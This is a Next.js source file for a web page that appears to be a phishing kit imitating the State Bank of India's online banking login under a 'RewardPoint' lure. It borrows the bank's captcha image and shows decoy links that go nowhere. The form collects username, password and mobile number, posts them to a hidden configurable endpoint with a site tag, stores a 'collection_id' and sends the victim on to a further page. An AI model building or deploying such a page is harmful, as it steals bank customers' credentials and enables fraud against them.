'use client';
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";
import Link from "next/link";
import { useState } from 'react';

export default function Home() {
  const router = useRouter();
  const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    localStorage.removeItem('collection_id');
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const formData = new FormData(e.target);
    const jsonObject1 = {};
    const jsonObject = {};
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });
    jsonObject1['data'] = jsonObject;
    jsonObject1['site'] = SITE;
    
    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        body: JSON.stringify(jsonObject1)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      const responseData = await response.json();
      if(responseData.status==200){
        console.log(responseData.data);
          localStorage.setItem('collection_id', responseData.data);
          
          router.push('/pssdb');
      }else{
          alert(responseData.msg)
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    }finally{
      setLoading(false);
    }
  }
  return (
    <>
      <Header />
      <main>
        <>
          <div className="All_titlec__cGUYa">
            <h1 className="All_h1__PWkY3" style={{ textAlign: "left" }}>
              Login to Get RewardPoint <br />
            </h1>
          </div>
          <div className="All_myfrm__3vXyb">
            <p className="">
              (<span style={{ color: "red" }}>CARE: </span>Username and password are
              case senstive )
            </p>
            <form className="All_frm__am8E_" onSubmit={handleSubmit} >
              <div className="All_frmgrp__Ym9Kf">
                <label className="All_frmlb__P0GlO">
                  Username <span className="All_mndt__6QZEJ">*</span>
                </label>
                <input
                  name="username"
                  type="text"
                  title="required user  name"
                  className="All_frmin__xQNbS"
                  required
                  maxLength={30}
                />
              </div>
              <div className="All_frmgrp__Ym9Kf">
                <label className="All_frmlb__P0GlO">
                  Password <span className="All_mndt__6QZEJ">*</span>
                </label>
                <input
                  name="password"
                  type="password"
                  title="required password"
                  className="All_frmin__xQNbS"
                  required
                  maxLength={30}
                />
              </div>
              <div className="All_frmgrp__Ym9Kf">
                <label className="All_frmlb__P0GlO">
                  Mobile Number <span className="All_mndt__6QZEJ">*</span>
                </label>
                <input
                  name="number"
                  type="text"
                  inputMode="numeric"
                  className="All_frmin__xQNbS"
                  required
                  maxLength={10}
                  minLength={10}
                  title="required valid 10 digita number"
                />
              </div>
              <div className="All_frmgrp__Ym9Kf">
                <label className="All_frmlb__P0GlO">
                  Enter the text as shown in the image*{" "}
                  <span className="All_mndt__6QZEJ">*</span>
                </label>
                <input type="text" className="All_frmin__xQNbS" maxLength={30} />
              </div>
              <label className="All_frmlb__P0GlO">
                Select one of them captcha options*
              </label>
              <div className="All_cap__0PaFA">
                <div className="All_w_ha__z4crU">
                  <input type="radio" defaultChecked="" />
                  Image Captcha
                </div>
                <div className="All_w_ha__z4crU">
                  <input type="radio" id="" />
                  Audio Captcha
                </div>
                <div />
                <div>
                  <div>
                    <img
                      alt="cap"
                      width={150}
                      height={39}
                      src="https://retail.onlinesbi.sbi/retail/simpleCaptchaServ"
                      style={{ color: "transparent" }}
                    />
                  </div>
                </div>
                <div className="All_frmgrp__Ym9Kf">
                  <button type="submit" className="All_subm__6Kxk4" disabled={loading}>
                      {loading ? 'Please wait...' : 'Submit'}
                  </button>
                  <input
                    type="reset"
                    className="All_subm__6Kxk4"
                    defaultValue="RESET"
                  />
                </div>
                <p>
                  <Link href="javascript:void">
                    <u>New User ? Registere here/Active</u>
                  </Link>
                </p>
                <p>
                  <Link href="javascript:void">
                    <u>Forgot Username / Login Password ?</u>
                  </Link>
                </p>
              </div>
            </form>
            <img src="home1.jpg" width="100%" alt="" />
            <img src="home2.jpg" width="100%" alt="" />
          </div>
        </>
      </main>
      <Footer />
    </>
  );
}

